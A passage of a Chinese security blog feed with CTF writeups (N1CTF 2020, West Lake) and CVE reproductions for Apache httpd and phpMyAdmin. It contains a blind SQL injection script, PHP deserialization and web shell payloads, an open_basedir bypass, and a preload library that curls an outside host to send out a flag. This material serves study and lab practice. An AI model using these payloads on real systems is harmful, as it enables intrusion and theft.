class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error($con);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</span><br><span class="line">    readfile(<span class="string">'/flag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</span><br><span class="line">    $input = $_GET[<span class="string">'input'</span>];</span><br><span class="line">unserialize($input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到代码的时候以为考的是序列化，但是在尝试过程中发现不是</p><p>开始的时候方向错了，按照习惯<code>new</code>了一个<code>flag</code>类，绕过<code>__wakeup()</code>魔术方法，后来和队内师傅交流才发现如果绕过了就拿不到回显，要改一下方向</p><p>这里注意到第一个类里存在<code>mysqli_error($con)</code>,结合拿到flag的条件，应该要注出数据库中的<code>key</code></p><p>这里不能绕过<code>__wakeup()</code>，根据数据中有无<code>n1ctf</code>来进行判断，根据回显的不同作为条件</p><p>上面的<code>sql</code>部分查到了一个题，用的是报错注入，这里也就用报错注入</p><p>这里开始想的是<code>updatexml</code>优先级太高，没有想到把<code>if</code>放到里面，队里师傅提醒，也就有了思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.32.205.189/index.php?input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";i:1;&#125;s:5:"check";s:4:"test";&#125;'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"1',updatexml(1,if(ascii(substr((select group_concat(b) from (select 1,2 as b union select * from n1key)a),&#123;&#125;,1))&gt;&#123;&#125;,1,concat(0x282b,('n1ctf'),0x292b)),1)),('1"</span>.format(</span><br><span class="line">            x, mid)</span><br><span class="line">        <span class="comment">#table:n1ip,n1key</span></span><br><span class="line">        <span class="comment">#n1ip:id,ip,time ip</span></span><br><span class="line">        <span class="comment">#n1key:id,key</span></span><br><span class="line">        <span class="comment">#2,n1ctf20205bf75ab0a30dfc0c</span></span><br><span class="line">        data = &#123;<span class="string">"X-Forwarded-For"</span>: payload&#125;</span><br><span class="line">        resp = requests.get(url, headers=data)  <span class="comment">#GET:params=data POST:data=data</span></span><br><span class="line">        print(resp.url)</span><br><span class="line">        <span class="comment"># print(resp.text)</span></span><br><span class="line">        <span class="keyword">if</span> resp.text.count(<span class="string">'noip'</span>) == <span class="number">2</span>:  <span class="comment">#</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="comment"># print(mid)</span></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="comment"># print(len(result))</span></span><br><span class="line">print(<span class="string">"end......."</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>这是用无列名盲注注出的key，前面查表数据库等用union联合盲注就可以了</p><p>(赛后发现key是sql数据库的关键词，用反引号包裹就能注出数据，比赛没想到，拉跨了…)</p><img src="/2020/10/20/n1ctf2020/1.png" class=""><p>这里用无列名是因为列是存在数据的，但是带不出来</p><p>下面就是序列化数据传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ip</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ip;</span><br><span class="line">        <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> flag();</span><br><span class="line">    $a-&gt;ip = <span class="keyword">new</span> ip();</span><br><span class="line">    $a-&gt;check = <span class="string">'n1ctf20205bf75ab0a30dfc0c'</span>;</span><br><span class="line">    $a-&gt;ip-&gt;ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:9:"127.0.0.1";&#125;s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";&#125;（注：不用new ip类也可以，比赛时懒得改了）</span></span><br></pre></td></tr></table></figure><p>传过去就能拿到flag了</p><img src="/2020/10/20/n1ctf2020/2.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛难度挺大的，也有收获，继续加油
    
    </summary>
    
    
    
      <category term="n1ctf" scheme="http://yoursite.com/tags/n1ctf/"/>
    
  </entry>
  
  <entry>
    <title>ApacheHTTPD换行解析漏洞CVE-2017-15715</title>
    <link href="http://yoursite.com/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/"/>
    <id>http://yoursite.com/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/</id>
    <published>2020-10-14T11:50:26.000Z</published>
    <updated>2020-10-23T10:06:20.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要<a id="more"></a></h2><p>Apache HTTPD<code>是一款HTTP服务器，它可以通过</code>mod_php<code>来运行</code>PHP<code>网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析</code>PHP<code>时，</code>1.php\x0a<code>将被按照</code>PHP`后缀进行解析，导致绕过一些服务器的安全策略。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>&lt;FilesMatch&gt;</code>中指定的表达式可以将’$’匹配到恶意文件名中的换行符，而不是仅匹配文件名的末尾。可以在外部阻止某些文件的上载但仅通过匹配文件名尾部的环境中利用此功能。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache httpd 2.4.0-2.4.29</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">装有docker的centos</span><br><span class="line">环境搭建</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub</span><br><span class="line">cd &#x2F;vulhub&#x2F;CVE-2018-15715</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这个<code>github</code>上拉下来的<code>index.php</code>中已经补全了上传的html代码，先来看一下重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到上传的文件名用的不是平常看到的<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>的形式，这是因为会自动去掉换行    </p><p>下面来看一下配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> \<span class="attr">.php</span>$&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">Options -Indexes</span><br><span class="line">AllowOverride All</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的以<code>php</code>为后缀的文件都会被当作<code>PHP</code>代码进行解析，问题就出在用<code>$</code>符进行了匹配，当<code>$</code>符进行正则匹配时会以换行符作为匹配结束的位置，这就造成了可以用换行符进行绕过对黑名单的检测</p><p>下面先上传一个<code>php</code>文件,burp抓包</p><p>当不作任何修改上传时</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/1.png" class=""><p>下面就是利用<code>CVE-2017-15715</code>的点，通过burp的hex功能添加换行符，图中标亮的就是修改的位置</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/2.png" class=""><p>上传成功</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/3.png" class=""><p>访问上传的shell，成功getshell</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/4.png" class=""><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.升级到最新版本</p><p>2.或将上传的文件重命名为为<code>时间戳+随机数+.jpg</code>的格式并禁用上传文件目录执行脚本权限</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞概要&quot;&gt;&lt;a href=&quot;#漏洞概要&quot; class=&quot;headerlink&quot; title=&quot;漏洞概要&quot;&gt;&lt;/a&gt;漏洞概要
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>westlake</title>
    <link href="http://yoursite.com/2020/10/11/westlake/"/>
    <id>http://yoursite.com/2020/10/11/westlake/</id>
    <published>2020-10-11T10:11:24.000Z</published>
    <updated>2020-10-13T11:30:26.007Z</updated>
    
    <content type="html"><![CDATA[<p>比赛那天疯狂补作业~~,今天赵总搭好环境了，上车~~<a id="more"></a></p><h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>编码绕过</li><li>通配符</li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'security.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">'sandbox/'</span>.sha1($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">"index.php"</span>,<span class="string">"&lt;?php echo 'Welcome To Dbapp OSS.';?&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">"write"</span> &amp;&amp;  SecurityCheck(<span class="string">'filename'</span>,$_GET[<span class="string">'filename'</span>]) &amp;&amp;SecurityCheck(<span class="string">'content'</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">"\n Powered By Dbapp OSS."</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">"reset"</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">"index.php"</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Security Check Failed.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑不是很难，创建一个沙箱，<code>$content</code>通过post传值，<code>$action</code>的值是<code>write</code>就能写入数据到指定的<code>$filename</code>中，可以看到<code>json_encode()</code>函数，不难发现传的数据要以<code>json</code>的格式</p><p>这里本地先测试一下，代码简短如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//post流传数据</span></span><br><span class="line">$content = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"><span class="comment">//json格式解码</span></span><br><span class="line">$content = json_decode($content);</span><br><span class="line">$newcontent = $content-&gt;content;</span><br><span class="line">print_r($newcontent);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/10/11/westlake/1.png" class=""><p>可以发现成功输出了content的值，但是题目环境写入失败，猜测是对content进行了过滤，用编码绕过，开始想到的是用<code>url</code>编码，但是发现并不能被成功解析</p><img src="/2020/10/11/westlake/2.png" class=""><p>尝试别的加密方式，<code>unicode</code>可以被解析</p><img src="/2020/10/11/westlake/3.png" class=""><p>这层<code>WAF</code>绕过之后，就要看写入文件的文件名了，发现<code>php</code>后缀没有被<code>ban</code>，成功写入，可以读取</p><img src="/2020/10/11/westlake/4.png" class=""><p>下面就可以写入命令执行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"\u0063\u006f\u006e\u0074\u0065\u006e\u0074"</span>:<span class="string">"&lt;?=`ls /`;?&gt;"</span>&#125; =&gt;<span class="keyword">echo</span> `ls`</span><br></pre></td></tr></table></figure><img src="/2020/10/11/westlake/5.png" class=""><p>后面就是读取flag文件了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"\u0063\u006f\u006e\u0074\u0065\u006e\u0074"</span>:<span class="string">"&lt;?=`cat /f*`;?&gt;"</span>&#125;</span><br><span class="line">&#123;<span class="string">"\u0063\u006f\u006e\u0074\u0065\u006e\u0074"</span>:<span class="string">"&lt;?=`cat /read*`;?&gt;"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="newupload"><a href="#newupload" class="headerlink" title="newupload"></a>newupload</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>换行上传php文件</li><li>desktop.ini污染马</li><li>php-fpm</li></ul><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>上传文件，经过测试，只有<code>jpg</code>文件才能成功上传，当时比赛环境是被<code>WAF</code>检测的文件都会<code>504</code></p><p>采取<code>1.\np\nh\np\n</code>绕过，同时小马用<code>desktop.ini</code>污染</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ï¿½ï¿½</span><br><span class="line">[.ShellClassInfo]</span><br><span class="line">LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,<span class="number">-21770</span></span><br><span class="line">IconResource=%SystemRoot%\system32\imageres.dll,<span class="number">-112</span></span><br><span class="line">IconFile=%SystemRoot%\system32\shell32.dll</span><br><span class="line">IconIndex=<span class="number">-235</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$_GET[<span class="number">0</span>]($_GET[<span class="number">1</span>]);phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看一下能不能上传成功</p><img src="/2020/10/11/westlake/6.png" class=""><p>成功上传，访问<code>/upload/1.php</code>，看一下当前目录</p><img src="/2020/10/11/westlake/7.png" class=""><p>没得到啥有用的信息，来读取一下<code>index.php</code></p><img src="/2020/10/11/westlake/8.png" class=""><p>只是一个文件上传的判断，但是<code>open_basedir</code>限制,绕过读取一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;suanve&#39;);chdir(&#39;suanve&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">var_dump(scandir(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&quot;.$_GET[&#39;dir&#39;]));</span><br></pre></td></tr></table></figure><img src="/2020/10/11/westlake/9.png" class=""><p>修改上传的shell，尝试读取<code>flag</code>，发现权限不够</p><p>列<code>tmp</code>目录，可以发现<code>sock</code>文件</p><img src="/2020/10/11/westlake/10.png" class=""><p>下面的步骤来自几篇博客文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;06&#x2F;10&#x2F;2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;186186#h2-7</span><br></pre></td></tr></table></figure><p>在自己的服务器上部署<code>so</code>文件，用<code>gcc</code>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl 123.56.22.0:6666/`/readflag`"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload是改自p神的项目，附上地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;phith0n&#x2F;9615e2420f31048f7e30f3937356cf75</span><br></pre></td></tr></table></figure><p>具体的原理可以看一下上面的两篇文章，下面就直接放复现的payload截图了</p><img src="/2020/10/11/westlake/11.png" class=""><p>通过<code>copy</code>函数，将自己服务器上编译完成的so文件复制到题目的<code>tmp</code>路径下，再访问上传的文件，同时监听<code>6666</code>端口，可以看到flag被成功带出</p><img src="/2020/10/11/westlake/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛那天疯狂补作业~~,今天赵总搭好环境了，上车~~
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>phpMyAdmin-4.8.1-CVE-2018-12613</title>
    <link href="http://yoursite.com/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/"/>
    <id>http://yoursite.com/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/</id>
    <published>2020-10-07T08:00:38.000Z</published>
    <updated>2020-10-09T06:59:38.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-关于phpmyadmin"><a href="#0x01-关于phpmyadmin" class="headerlink" title="0x01 关于phpmyadmin"></a>0x01 关于phpmyadmin<a id="more"></a></h2><p>phpMyAdmin 是众多 MySQL图形化管理工具中使用最为广泛的一种，是一款使用PHP 开发的基于B/S模式的 MySQL 客户端软件，该工具是基于 Web 跨平台的管理程序，并且支持简体中文，用户可以在官网上下载最新版本的。phpMyAdmin 为Web 开发人员提供了类似 Access，SQL Server 的图形化数据库操作界面，通过该管理工具可以对 MySQL 进行各种操作，如何创建数据库，数据表和生成 MySQL 数据库脚本文件等。</p><h2 id="0x02漏洞描述"><a href="#0x02漏洞描述" class="headerlink" title="0x02漏洞描述"></a>0x02漏洞描述</h2><p>攻击者可以在该漏洞中包含（查看并可能执行）服务器上的文件。</p><p>该漏洞来自代码的一部分，其中页面被重定向并在phpMyAdmin中加载，以及对白名单页面的不正确测试。</p><p>除以下情况外，必须对攻击者进行身份验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- $ cfg [&#39;AllowArbitraryServer&#39;] &#x3D; true：攻击者可以指定他&#x2F;她已控制的任何主机，并在phpMyAdmin上执行任意代码</span><br><span class="line">- $ cfg [&#39;ServerDefault&#39;] &#x3D; 0：这绕过登录并运行易受攻击的代码，而无需任何身份验证</span><br></pre></td></tr></table></figure><h2 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h2><p>phpMyAdmin 4.8.0和4.8.1</p><h2 id="0x04复现环境"><a href="#0x04复现环境" class="headerlink" title="0x04复现环境"></a>0x04复现环境</h2><p>phpstudy+phpmyadmin4.8.1</p><h2 id="0x05漏洞分析"><a href="#0x05漏洞分析" class="headerlink" title="0x05漏洞分析"></a>0x05漏洞分析</h2><p>该漏洞点在index.php中的55~64行的代码处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span 